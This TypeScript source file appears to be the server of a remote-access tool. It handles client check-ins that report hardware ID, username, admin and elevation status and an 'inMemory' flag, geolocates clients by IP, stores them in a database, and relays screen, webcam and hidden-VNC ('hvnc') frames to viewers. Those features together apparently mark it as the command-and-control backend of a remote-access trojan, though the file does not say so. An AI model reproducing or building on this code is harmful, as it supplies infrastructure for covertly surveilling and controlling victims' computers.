import { encodeMessage, type Hello, type Ping, type WireMessage } from "./protocol";

let _geoip: typeof import("geoip-lite");
async function getGeoip() {
  if (!_geoip) {
    _geoip = (await import("geoip-lite")).default;
  }
  return _geoip;
}
import { ClientInfo } from "./types";
import {
  isThumbnailRequested,
  hasThumbnail,
  setLatestFrame,
  notifyThumbnailGenerated,
  requestThumbnailRegen,
} from "./thumbnails";
import { upsertClientRow } from "./db";
import { metrics } from "./metrics";
import { markClientDbSynced, queueClientDbUpdate, shouldSyncClientToDb } from "./client-db-sync";

export { clearClientSyncState } from "./client-db-sync";

/** Strip control chars and clamp length on client-supplied info strings. */
function sanitizeInfoString(val: unknown, maxLen = 256): string | undefined {
  if (typeof val !== "string") return undefined;
  return val.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "").slice(0, maxLen);
}

function sanitizeMonitorCount(val: unknown): number | undefined {
  if (typeof val !== "number" || !Number.isFinite(val)) return undefined;
  const n = Math.floor(val);
  if (n < 0) return 0;
  if (n > 32) return 32;
  return n;
}

function sanitizePercent(val: unknown): number | undefined {
  if (typeof val !== "number" || !Number.isFinite(val)) return undefined;
  const n = Math.round(val);
  if (n < 0 || n > 100) return undefined;
  return n;
}

function sanitizeJsonField(
  val: unknown,
  opts: { maxJsonBytes: number; maxArrayLen?: number; maxKeys?: number },
): unknown | undefined {
  if (val === null || val === undefined) return undefined;
  if (typeof val !== "object") return undefined;
  if (Array.isArray(val) && opts.maxArrayLen !== undefined && val.length > opts.maxArrayLen) {
    return undefined;
  }
  if (!Array.isArray(val) && opts.maxKeys !== undefined) {
    const keys = Object.keys(val as Record<string, unknown>);
    if (keys.length > opts.maxKeys) return undefined;
  }
  let serialized: string;
  try {
    serialized = JSON.stringify(val);
  } catch {
    return undefined;
  }
  if (serialized.length > opts.maxJsonBytes) return undefined;
  return val;
}

const MAX_PING_RTT_MS = 15_000;

export async function handleHello(
  info: ClientInfo,
  payload: Hello,
  ws: any,
  ip?: string,
) {
  if (ip) {
    info.ip = ip;
  }
  const reportedPublicIP = sanitizeInfoString((payload as any).publicIP, 64);
  if (reportedPublicIP && /^[0-9a-fA-F:.]{3,45}$/.test(reportedPublicIP)) {
    info.ip = reportedPublicIP;
  }
  info.hwid = sanitizeInfoString((payload as any).hwid);
  info.host = sanitizeInfoString(payload.host);
  info.os = sanitizeInfoString(payload.os);
  info.arch = sanitizeInfoString(payload.arch, 32);
  info.hostArch = sanitizeInfoString((payload as any).hostArch, 32) || info.arch;
  info.version = sanitizeInfoString(payload.version, 64);
  info.user = sanitizeInfoString(payload.user);
  info.monitors = sanitizeMonitorCount(payload.monitors) ?? info.monitors;
  const cleanMonitorInfo = sanitizeJsonField((payload as any).monitorInfo, {
    maxJsonBytes: 8 * 1024,
    maxArrayLen: 32,
  });
  if (cleanMonitorInfo !== undefined) {
    info.monitorInfo = cleanMonitorInfo as any;
  }
  info.inMemory = !!(payload as any).inMemory;
  info.isAdmin = !!(payload as any).isAdmin;
  info.elevation = sanitizeInfoString((payload as any).elevation, 32) ?? info.elevation;
  const cleanPermissions = sanitizeJsonField((payload as any).permissions, {
    maxJsonBytes: 4 * 1024,
    maxKeys: 64,
  });
  if (cleanPermissions !== undefined && !Array.isArray(cleanPermissions)) {
    info.permissions = cleanPermissions as any;
  }
  info.cpu = sanitizeInfoString((payload as any).cpu) || info.cpu;
  info.gpu = sanitizeInfoString((payload as any).gpu) || info.gpu;
  info.ram = sanitizeInfoString((payload as any).ram, 64) || info.ram;
  const batteryPercent = sanitizePercent((payload as any).batteryPercent);
  if (batteryPercent !== undefined) {
    info.batteryPercent = batteryPercent;
    info.batteryCharging = !!(payload as any).batteryCharging;
  }
  const geoip = await getGeoip();
  const geo = info.ip ? geoip.lookup(info.ip) : undefined;
  const countryRaw =
    geo?.country || (payload as any).country || info.country || "ZZ";
  const country = /^[A-Z]{2}$/i.test(countryRaw)
    ? countryRaw.toUpperCase()
    : "ZZ";
  info.country = country;
  info.lastSeen = Date.now();
  info.online = true;

  upsertClientRow({
    id: info.id,
    hwid: info.hwid,
    role: info.role,
    ip: info.ip,
    host: info.host,
    os: info.os,
    arch: info.arch,
    version: info.version,
    user: info.user,
    monitors: info.monitors,
    country: info.country,
    cpu: info.cpu,
    gpu: info.gpu,
    ram: info.ram,
    batteryPercent: info.batteryPercent,
    batteryCharging: info.batteryCharging,
    isAdmin: info.isAdmin,
    elevation: info.elevation,
    permissions: info.permissions,
    lastSeen: info.lastSeen,
    online: 1,
  });

  sendPingRequest(info, ws, "hello");

}

export function handlePing(info: ClientInfo, payload: Ping, ws: any) {
  //console.log(`[ping] from client=${info.id} ts=${payload.ts ?? ""}`);
  const now = Date.now();
  info.lastSeen = now;
  info.online = true;
  if (shouldSyncClientToDb(info.id, now)) {
    queueClientDbUpdate({
      id: info.id,
      lastSeen: info.lastSeen,
      online: 1,
      isAdmin: info.isAdmin,
    });
  }
  ws.send(encodeMessage({ type: "pong", ts: payload.ts || Date.now() }));
  sendPingRequest(info, ws, "client_ping");
}

export function sendPingRequest(info: ClientInfo, ws: any, reason: string) {
  const now = Date.now();
  if (info.lastPingSent && now - info.lastPingSent < 1_000) {
    return;
  }
  const nonce = now + Math.floor(Math.random() * 1000);
  info.lastPingSent = now;
  info.lastPingNonce = nonce;
  //console.log(`[ping] send ping to client=${info.id} reason=${reason} nonce=${nonce}`);
  ws.send(encodeMessage({ type: "ping", ts: nonce }));
}

export function handlePong(info: ClientInfo, payload: WireMessage) {
  const tsRaw = (payload as any).ts;
  const ts = typeof tsRaw === "number" ? tsRaw : Number(tsRaw);
  if (!Number.isFinite(ts)) {
    return;
  }

  const now = Date.now();
  const maxRttMs = MAX_PING_RTT_MS;
  const expectedNonce = info.lastPingNonce;
  if (expectedNonce === undefined) {
    return;
  }
  if (ts !== expectedNonce) {
    return;
  }
  if (!info.lastPingSent) {
    return;
  }

  const rtt = now - info.lastPingSent;
  const nowTs = Date.now();

  info.lastSeen = nowTs;
  info.lastPongAt = nowTs;
  info.online = true;
  info.lastPingNonce = undefined;

  if (rtt >= 0 && rtt < maxRttMs) {
    info.pingMs = rtt;
    queueClientDbUpdate({
      id: info.id,
      pingMs: info.pingMs,
      lastSeen: info.lastSeen,
      online: 1,
      isAdmin: info.isAdmin,
    });
    markClientDbSynced(info.id, nowTs);

    metrics.recordPing(rtt);
  } else {
    if (shouldSyncClientToDb(info.id, nowTs)) {
      queueClientDbUpdate({
        id: info.id,
        lastSeen: info.lastSeen,
        online: 1,
        isAdmin: info.isAdmin,
      });
    }
  }
}

export function handleFrame(info: ClientInfo, payload: any) {
  const bytes = payload.data as unknown as Uint8Array;
  const header = (payload as any).header;
  const allowedFormats = ["jpeg", "jpg", "webp"];
  const fmt = String(header?.format || "").toLowerCase();
  const safeFormat = allowedFormats.includes(fmt) ? fmt : "";

  metrics.recordBytesReceived(bytes.length);

  let sentToViewers = false;
  try {
    const globalAny: any = globalThis as any;
    if (header?.webcam) {
      if (globalAny.__webcamBroadcast) {
        sentToViewers = globalAny.__webcamBroadcast(info.id, bytes, header);
      }
      if (sentToViewers) {
        return;
      }
    } else if (header?.hvnc) {
      if (globalAny.__hvncBroadcast) {
        sentToViewers = globalAny.__hvncBroadcast(info.id, bytes, header);
      }
      if (sentToViewers) {
        return;
      }
    } else if (globalAny.__rdBroadcast) {
      sentToViewers = globalAny.__rdBroadcast(info.id, bytes, header);
      if (sentToViewers) {
        return;
      }
    }
  } catch {}

  if (safeFormat) {
    const now = Date.now();
    const thumbnailRequested = isThumbnailRequested(info.id);
    if (thumbnailRequested || !hasThumbnail(info.id)) {
      setLatestFrame(info.id, bytes, safeFormat);
      void requestThumbnailRegen(info.id).then((ok) => {
        if (ok) notifyThumbnailGenerated(info.id);
      });
    }
    info.lastSeen = now;
    info.online = true;
    if (shouldSyncClientToDb(info.id, now)) {
      queueClientDbUpdate({ id: info.id, lastSeen: now, online: 1, isAdmin: info.isAdmin });
    }
  }
}
